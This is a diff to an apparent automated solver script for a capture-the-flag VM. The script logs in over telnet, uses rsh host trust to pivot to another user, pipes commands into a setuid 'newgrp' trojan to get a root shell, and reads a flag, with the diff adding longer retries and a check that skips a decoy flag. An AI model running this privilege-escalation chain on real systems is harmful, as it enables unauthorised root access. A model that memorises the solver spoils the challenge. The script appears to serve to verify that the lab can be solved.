@@ -29,6 +29,7 @@ FPASS  = os.environ.get("BOX_FOOTHOLD_PASS", "newriver")
 DUSER  = os.environ.get("BOX_TRUST_USER", "dono")
 LOOTD  = os.environ.get("BOX_LOOT_DIR", "/usr/src/sys/maniac")
 EXPECT = os.environ.get("BOX_EXPECT_FLAG", "")
+DECOY  = os.environ.get("BOX_FLAG_DECOY", "")
 SERLOG = os.environ.get("BOX_SOLVE_SERIAL", "work/solve-serial.log")
 CR = "\r"
 
@@ -82,9 +83,11 @@ def main():
         # The host-side hostfwd port opens as soon as QEMU starts, well before the
         # guest's ed1/inetd are actually up — so an early connect gets closed.
         # Retry until telnetd presents a login: prompt.
+        # LUKS decryption + TCG makes the multiuser boot slow (~5-8 min); give the
+        # retry loop generous headroom before declaring telnetd unreachable.
         tn = None
-        for attempt in range(8):
-            time.sleep(8)
+        for attempt in range(16):
+            time.sleep(10)
             tn = pexpect.spawn(f"telnet 127.0.0.1 {TPORT}", encoding="latin-1", timeout=60)
             tn.logfile_read = open(SERLOG.replace(".log", "-telnet.log"), "w", encoding="latin-1")
             try:
@@ -141,24 +144,33 @@ def main():
             log("interactive dono shell via rlogin OK")
             tn.sendline("exit"); tn.expect(r"BRIAN> ", timeout=30)  # back to brian
 
-        # ---- privesc + loot in ONE shot: pipe commands into the root shell the
-        #      setuid newgrp trojan spawns, reached as dono over the trust.  This
-        #      avoids parsing nested interactive shells (echo state etc).
-        tn.sendline("echo 'id; cat %s/flag.txt' | rsh localhost -l %s 'newgrp -hack root' 2>&1"
-                    % (LOOTD, DUSER))
-        tn.expect(r"BRIAN> ", timeout=90)
-        body = tn.before
-        if "uid=0" not in body:
-            log("PRIVESC FAILED: no uid=0 from newgrp trojan (%r)" % " ".join(body.split())[:200])
-            return 4
+        # ---- privesc + loot: pipe commands into the root shell the setuid newgrp
+        #      trojan spawns, reached as dono over the trust.  The real flag is
+        #      materialised into RAM by gen-flag at boot, which can run a beat AFTER
+        #      inetd/telnetd come up (a real player is slow enough not to notice);
+        #      so retry the read until the REAL flag (not the on-disk decoy) appears.
+        uid0 = False; flag = ""
+        for attempt in range(15):
+            tn.sendline("echo 'id; cat %s/flag.txt' | rsh localhost -l %s 'newgrp -hack root' 2>&1"
+                        % (LOOTD, DUSER))
+            tn.expect(r"BRIAN> ", timeout=90)
+            body = tn.before
+            if "uid=0" in body:
+                uid0 = True
+            f = ""
+            for line in body.splitlines():
+                if "BU{" in line:
+                    f = line[line.index("BU{"):].split("}")[0] + "}"; break
+            if f and f != DECOY:
+                flag = f; break
+            if f == DECOY:
+                log("attempt %d: only the decoy so far — waiting for gen-flag (MFS)..." % (attempt + 1))
+            time.sleep(6)
+        if not uid0:
+            log("PRIVESC FAILED: never saw uid=0 from newgrp trojan"); return 4
         log("privesc OK: uid=0 root shell via setuid newgrp trojan")
-        flag = ""
-        for line in body.splitlines():
-            if "BU{" in line:
-                flag = line[line.index("BU{"):].split("}")[0] + "}"
-                break
         if not flag:
-            log("LOOT FAILED: no BU{...} flag in %s/flag.txt" % LOOTD); return 5
+            log("LOOT FAILED: only the decoy after retries — gen-flag/MFS not materialising the real flag"); return 5
         log("flag recovered: %s" % flag)
         if EXPECT and flag != EXPECT:
             log("FLAG MISMATCH: got %s, expected %s" % (flag, EXPECT)); return 6
